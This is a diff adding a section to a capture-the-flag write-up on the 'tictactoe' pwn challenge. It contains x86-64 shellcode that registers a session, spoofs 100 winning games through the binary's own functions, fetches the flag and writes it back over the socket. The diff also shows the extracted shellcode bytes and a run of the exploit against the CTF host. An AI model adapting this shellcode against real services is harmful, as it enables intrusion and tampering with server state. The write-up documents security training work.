@@ -426,5 +426,260 @@ Remember the first idea to jump into the stack? We gave up because we couldn't f
 
 ![](img/shellcode0.png)
 
+## Shellcode
+Ok this way we can create a shellcode of length 0x800 - 96 with null bytes allowed! Now the question is why duplicating file descriptors and then invoking execve("/bin/sh") is not enought to get a flag? Well in fact it is enought, but we still have to simulate a game as a main server does not fully trust tictactoe app (it keeps the number of levels user owned and current board state in ram and asks client only for computer & human moves). So our attack scenario would be to just send "bad" computer moves. And I personally find it easier to use already existing in tictactoe app functions for communicating with main server.
+
+## Fake game
+So we need to create a malicious shellcode which will communicate with main server on our behalf.
+It must first get session by registering user. The app uses:
+
+`int send_reg_user(char *server_ip,char *session)`
+
+function to register user. Both server_ip and session are global variables and therefore we know their addresses. So this part of shellcode can look like:
+
+```asm
+SERVER_IP_ADDR          equ 0x405728
+SESSION_ADDR            equ 0x405740
+
+SEND_REQ_USER_FUNC_ADDR equ 0x402835 
+
+section .text
+    global _start
+
+_start:
+_register_user:
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rax, SEND_REQ_USER_FUNC_ADDR 
+    call rax
+
+```
+
+To send moves, the tictactoe uses `int send_state(char *server_ip,char *session,int cmove,int hmove)` function which takes as arguments: server_ip, session and two int variables: cmove, hmove.
+Then to spoof a game (consists of 3 computer and 3 human moves) we can write such code:
+
+```asm
+CMOVE1                  equ 0 
+CMOVE2                  equ 3
+CMOVE3                  equ 2
+HMOVE1                  equ 1
+HMOVE2                  equ 4
+HMOVE3                  equ 7
+
+SERVER_IP_ADDR          equ 0x405728
+SESSION_ADDR            equ 0x405740
+
+SEND_STATE_FUNC_ADDR    equ 0x402a74
+SEND_REQ_USER_FUNC_ADDR equ 0x402835 
+
+section .text
+    global _start
+
+_start:
+_register_user:
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rax, SEND_REQ_USER_FUNC_ADDR 
+    call rax
+
+_win_game:
+    ; cmove: 0 hmove: 1
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rdx, CMOVE1
+    mov rcx, HMOVE1
+    mov rax, SEND_STATE_FUNC_ADDR
+    call rax
+
+    ; cmove: 3 hmove: 4
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rdx, CMOVE2
+    mov rcx, HMOVE2
+    mov rax, SEND_STATE_FUNC_ADDR
+    call rax
+
+    ; cmove: 2 hmove: 7
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rdx, CMOVE3
+    mov rcx, HMOVE3
+    mov rax, SEND_STATE_FUNC_ADDR
+    call rax
+```
+
+We have to win the game 100 times so let's wrap it with a loop. We will use $rbx register as it is callee-saved register and will not get modified by `send_state` function.
+
+```asm
+CMOVE1                  equ 0 
+CMOVE2                  equ 3
+CMOVE3                  equ 2
+HMOVE1                  equ 1
+HMOVE2                  equ 4
+HMOVE3                  equ 7
+
+SERVER_IP_ADDR          equ 0x405728
+SESSION_ADDR            equ 0x405740
+
+SEND_STATE_FUNC_ADDR    equ 0x402a74
+SEND_REQ_USER_FUNC_ADDR equ 0x402835 
+
+section .text
+    global _start
+
+_start:
+_register_user:
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rax, SEND_REQ_USER_FUNC_ADDR 
+    call rax
+
+_start_game:
+   xor rbx, rbx ; store act number of wins in rbx
 
 
+_win_game:
+    ; cmove: 0 hmove: 1
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rdx, CMOVE1
+    mov rcx, HMOVE1
+    mov rax, SEND_STATE_FUNC_ADDR
+    call rax
+
+    ; cmove: 3 hmove: 4
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rdx, CMOVE2
+    mov rcx, HMOVE2
+    mov rax, SEND_STATE_FUNC_ADDR
+    call rax
+
+    ; cmove: 2 hmove: 7
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rdx, CMOVE3
+    mov rcx, HMOVE3
+    mov rax, SEND_STATE_FUNC_ADDR
+    call rax
+
+    inc rbx
+    cmp rbx, NWINS
+    jne _win_game
+```
+
+Finally we have to ask server for a flag. It can be done by invoking `int send_get_flag(char *server_ip,char *session,char *message)` function. We already know the server_ip and session arguments. The message is just a buffer in which the flag get stored. 
+To send flag back to us, we will use a write syscall (the socket is already open).
+The final shellcode looks like:
+
+```asm
+SEND_REQ_USER_FUNC_ADDR equ 0x402835 
+SEND_STATE_FUNC_ADDR    equ 0x402a74
+SEND_GET_FLAG_FUNC_ADDR equ 0x402ce1
+
+SERVER_IP_ADDR          equ 0x405728
+SESSION_ADDR            equ 0x405740
+
+FLAG_BUF_ADDR           equ 0x405870 ; &name + 256
+FLAG_LEN                equ 0x102
+
+CMOVE1                  equ 0 
+CMOVE2                  equ 3
+CMOVE3                  equ 2
+HMOVE1                  equ 1
+HMOVE2                  equ 4
+HMOVE3                  equ 7
+
+NWINS                   equ 100
+
+PSOCK                   equ 4
+
+SYS_WRITE               equ 1
+
+
+section .text
+    global _start
+
+_start:
+_register_user:
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rax, SEND_REQ_USER_FUNC_ADDR 
+    call rax
+
+
+_start_game:
+   xor rbx, rbx ; store act number of wins in rbx
+
+
+_win_game:
+    ; cmove: 0 hmove: 1
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rdx, CMOVE1
+    mov rcx, HMOVE1
+    mov rax, SEND_STATE_FUNC_ADDR
+    call rax
+
+    ; cmove: 3 hmove: 4
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rdx, CMOVE2
+    mov rcx, HMOVE2
+    mov rax, SEND_STATE_FUNC_ADDR
+    call rax
+
+    ; cmove: 2 hmove: 7
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rdx, CMOVE3
+    mov rcx, HMOVE3
+    mov rax, SEND_STATE_FUNC_ADDR
+    call rax
+
+    inc rbx
+    cmp rbx, NWINS
+    jne _win_game
+
+
+_get_flag:
+    mov rdi, qword [SERVER_IP_ADDR]
+    mov rsi, SESSION_ADDR
+    mov rdx, FLAG_BUF_ADDR
+    mov rax, SEND_GET_FLAG_FUNC_ADDR
+    call rax
+
+
+_send_flag:
+    mov rdi, PSOCK
+    mov rsi, FLAG_BUF_ADDR
+    mov rdx, FLAG_LEN
+    mov rax, SYS_WRITE
+    syscall
+```
+
+We can now extract it:
+
+```bash
+$ nasm -f elf64 1_shellcode.asm -o 1_shellcode.o
+
+$ for i in `objdump -d 1_shellcode.o |grep "^ " |cut -f2`; do echo -n '\x'$i; done; echo
+\x48\x8b\x3c\x25\x28\x57\x40\x00\xbe\x40\x57\x40\x00\xb8\x35\x28\x40\x00\xff\xd0\x48\x31\xdb\x48\x8b\x3c\x25\x28\x57\x40\x00\xbe\x40\x57\x40\x00\xba\x00\x00\x00\x00\xb9\x01\x00\x00\x00\xb8\x74\x2a\x40\x00\xff\xd0\x48\x8b\x3c\x25\x28\x57\x40\x00\xbe\x40\x57\x40\x00\xba\x03\x00\x00\x00\xb9\x04\x00\x00\x00\xb8\x74\x2a\x40\x00\xff\xd0\x48\x8b\x3c\x25\x28\x57\x40\x00\xbe\x40\x57\x40\x00\xba\x02\x00\x00\x00\xb9\x07\x00\x00\x00\xb8\x74\x2a\x40\x00\xff\xd0\x48\xff\xc3\x48\x83\xfb\x64\x75\x9d\x48\x8b\x3c\x25\x28\x57\x40\x00\xbe\x40\x57\x40\x00\xba\x70\x58\x40\x00\xb8\xe1\x2c\x40\x00\xff\xd0\xbf\x04\x00\x00\x00\xbe\x70\x58\x40\x00\xba\x02\x01\x00\x00\xb8\x01\x00\x00\x00\x0f\x05
+```
+
+And test our [exploit](exp.py)
+
+```bash
+$ python3 exp.py remote
+[*] '/home/k/cz/tictactoe_files/tictactoe'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+[+] Opening connection to pwn-tictactoe.ctfz.one on port 8889: Done
+[*] Switching to interactive mode
+ctfzone{h3r3_w3_g0_4g41n_t1c_t4c_t03_1z_4_n1z3_g4m3}
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
+```
